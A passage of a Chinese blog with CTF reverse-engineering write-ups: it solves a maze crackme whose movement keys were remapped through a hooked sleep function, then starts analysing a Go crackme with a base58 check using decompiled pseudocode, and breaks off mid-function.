class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">0</span> <span class="number">1</span> <span class="number">1</span> <span class="number">0</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">0</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span>  </span><br><span class="line"><span class="attribute">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">0</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">0</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">0</span> <span class="number">1</span> <span class="number">0</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span>  </span><br><span class="line"><span class="attribute">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">0</span> <span class="number">0</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">0</span> <span class="number">1</span> <span class="number">0</span> <span class="number">1</span> <span class="number">0</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span>  </span><br><span class="line"><span class="attribute">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">0</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">0</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">0</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span>  </span><br><span class="line"><span class="attribute">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">0</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span>  </span><br><span class="line"><span class="attribute">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">0</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">0</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span>  </span><br><span class="line"><span class="attribute">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span>  </span><br><span class="line"><span class="attribute">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">0</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">0</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span>  </span><br><span class="line"><span class="attribute">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">0</span> <span class="number">1</span> <span class="number">0</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">0</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">0</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span>  </span><br><span class="line"><span class="attribute">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">0</span> <span class="number">1</span> <span class="number">0</span> <span class="number">1</span> <span class="number">0</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">0</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span>  </span><br><span class="line"><span class="attribute">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">0</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">0</span> <span class="number">1</span> <span class="number">0</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">0</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span>  </span><br><span class="line"><span class="attribute">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">0</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">0</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">0</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span>  </span><br><span class="line"><span class="attribute">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">0</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">0</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">0</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span>  </span><br><span class="line"><span class="attribute">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">0</span> <span class="number">1</span> <span class="number">0</span> <span class="number">1</span> <span class="number">0</span> <span class="number">1</span> <span class="number">0</span> <span class="number">1</span> <span class="number">0</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">1</span> <span class="number">1</span>  </span><br><span class="line"><span class="attribute">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">0</span> <span class="number">1</span> <span class="number">0</span> <span class="number">1</span> <span class="number">0</span> <span class="number">1</span> <span class="number">0</span> <span class="number">1</span> <span class="number">0</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">0</span> <span class="number">1</span> <span class="number">1</span>  </span><br><span class="line"><span class="attribute">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">0</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">0</span> <span class="number">1</span> <span class="number">1</span>  </span><br><span class="line"><span class="attribute">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">0</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">0</span> <span class="number">1</span> <span class="number">1</span>  </span><br><span class="line"><span class="attribute">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">0</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">0</span> <span class="number">1</span> <span class="number">0</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">0</span> <span class="number">0</span> <span class="number">1</span>  </span><br><span class="line"><span class="attribute">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">0</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">0</span> <span class="number">1</span> <span class="number">0</span> <span class="number">1</span> <span class="number">0</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">0</span> <span class="number">1</span>  </span><br><span class="line"><span class="attribute">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">0</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">0</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">0</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">0</span> <span class="number">1</span>  </span><br><span class="line"><span class="attribute">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">0</span> <span class="number">1</span> <span class="number">0</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">0</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span>  </span><br><span class="line"><span class="attribute">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">0</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">0</span> <span class="number">1</span> <span class="number">0</span> <span class="number">1</span> <span class="number">0</span> <span class="number">0</span>  </span><br><span class="line"><span class="attribute">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">2</span> <span class="number">1</span> <span class="number">0</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span></span><br></pre></td></tr></table></figure>



<p>不过怎么走都好像不能走75到终点，查看交叉引用</p>
<p><img src="/2022/11/28/2022%E5%AE%89%E6%B4%B5%E6%9D%AF/image-20221128231849609.png" alt="image-20221128231849609"></p>
<p><img src="/2022/11/28/2022%E5%AE%89%E6%B4%B5%E6%9D%AF/image-20221128231901022.png" alt="image-20221128231901022"></p>
<p>发现，起点被改了（2，2），终点位置也变了，但发现好像还是走不到75步，最后发现sleep好像被hook了，</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __stdcall <span class="title function_">sub_402330</span><span class="params">(<span class="type">int</span> a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">switch</span> ( a1 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0x11</span>:</span><br><span class="line">      --x;</span><br><span class="line">      a1 = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0x12</span>:</span><br><span class="line">      ++x;</span><br><span class="line">      a1 = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0x13</span>:</span><br><span class="line">      ++y;</span><br><span class="line">      a1 = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0x14</span>:</span><br><span class="line">      --y;</span><br><span class="line">      a1 = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">      <span class="keyword">return</span> dword_406890(a1);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> dword_406890(a1);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>发现了原来这个东西是斜着走的，比如当输入为A,是向左下走的，输入为D,是向右上角走的，输入为S,是向右下角走的，输入为W,是向左上角走的，得到路线：dssaaasasssdsddddwddssasaaassdsssaasssddssasaassaaassdsdsssaaassddddsdssasa</p>
<h2 id="PYC-pyc"><a href="#PYC-pyc" class="headerlink" title="PYC.pyc"></a>PYC.pyc</h2>
      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://jonathanbest7.github.io/2022/11/08/%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/bitbug_favicon.ico">
      <meta itemprop="name" content="bj777">
      <meta itemprop="description" content="一位逆向菜狗">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="bj777的blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/11/08/%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81/" class="post-title-link" itemprop="url">强网拟态</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>
              

              <time title="创建时间：2022-11-08 13:28:48 / 修改时间：19:36:46" itemprop="dateCreated datePublished" datetime="2022-11-08T13:28:48+08:00">2022-11-08</time>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="强网拟态"><a href="#强网拟态" class="headerlink" title="强网拟态"></a>强网拟态</h1><h2 id="re"><a href="#re" class="headerlink" title="re"></a>re</h2><p>本次出了三道逆向题，是有史以来最多的一次，两个题都是第7个做出来的。</p>
<h3 id="comeongo"><a href="#comeongo" class="headerlink" title="comeongo"></a>comeongo</h3><p>go语言逆向，main_main里两个地方，主要加密再greetingscheck（）</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">v19 = fmt_Scan(v6, v12, v16);</span><br><span class="line">v21 = main_Greetingscheck(v7, v13, v17, v19);</span><br><span class="line">fmt_Printf(v8, v14, v18, v20, v21);</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">v8 = main_check1();</span><br><span class="line">v10 = v6;</span><br><span class="line"><span class="keyword">if</span> ( v6 )</span><br><span class="line">&#123;</span><br><span class="line">  main_check2(v8);</span><br><span class="line">  v10 = v7;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> v10 != <span class="number">0</span>;</span><br></pre></td></tr></table></figure>

<p>两个check函数，前16字节都是在check1</p>
<p>check1很好过，是一个base58</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __golang <span class="title function_">main_runtime_Encoding</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 v0; <span class="comment">// rax</span></span><br><span class="line">  __int64 v1; <span class="comment">// r14</span></span><br><span class="line">  __int128 v2; <span class="comment">// xmm15</span></span><br><span class="line">  __int64 v3; <span class="comment">// rbx</span></span><br><span class="line">  __int64 v4; <span class="comment">// rax</span></span><br><span class="line">  __int64 v5; <span class="comment">// rcx</span></span><br><span class="line">  __int64 v6; <span class="comment">// rax</span></span><br><span class="line">  __int64 v7; <span class="comment">// rax</span></span><br><span class="line">  __int64 v8; <span class="comment">// rax</span></span><br><span class="line">  __int64 v9; <span class="comment">// rax</span></span><br><span class="line">  __int64 v10; <span class="comment">// rax</span></span><br><span class="line">  __int64 v11; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v12; <span class="comment">// rax</span></span><br><span class="line">  __int64 v13; <span class="comment">// rcx</span></span><br><span class="line">  __int64 v14; <span class="comment">// rdi</span></span><br><span class="line">  __int64 v15; <span class="comment">// rbx</span></span><br><span class="line">  __int64 v16; <span class="comment">// rsi</span></span><br><span class="line">  __int64 v17; <span class="comment">// rax</span></span><br><span class="line">  __int64 v18; <span class="comment">// rcx</span></span><br><span class="line">  __int64 v19; <span class="comment">// rcx</span></span><br><span class="line">  __int64 v20; <span class="comment">// rsi</span></span><br><span class="line">  __int64 v21; <span class="comment">// rdi</span></span><br><span class="line">  __int64 v22; <span class="comment">// rbx</span></span><br><span class="line">  __int64 v23; <span class="comment">// rax</span></span><br><span class="line">  __int64 v24; <span class="comment">// rcx</span></span><br><span class="line">  __int64 v25; <span class="comment">// rbx</span></span><br><span class="line">  __int64 v26; <span class="comment">// rax</span></span><br><span class="line">  __int64 v27; <span class="comment">// rcx</span></span><br><span class="line">  __int64 v28; 